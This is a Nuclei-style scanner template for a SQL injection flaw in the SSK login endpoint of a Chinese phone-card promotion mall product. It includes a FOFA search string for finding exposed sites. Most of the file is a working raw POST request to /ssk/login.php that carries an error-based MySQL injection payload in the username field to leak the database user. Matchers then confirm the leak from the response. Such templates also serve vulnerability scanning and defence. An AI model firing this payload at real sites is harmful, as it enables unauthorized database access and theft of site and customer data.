id: mobile-mall-ssk-sqli

info:
  name: 手机卡号推广商城SSK接口SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="zgdx.php"
      该漏洞源于目标系统在处理SSK接口请求时未正确过滤用户输入参数，攻击者可通过构造恶意SQL查询实现数据库操作权限突破，导致敏感数据泄露或数据完整性受损。
  tags: 手机卡号推广商城

http:
- raw:
  - |
    POST /ssk/login.php HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
    Cache-Control: max-age=0
    Content-Type: application/x-www-form-urlencoded
    Connection: close

    username=' OR (SELECT 6442 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- FIjp&password=123123
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'mysqli_query'
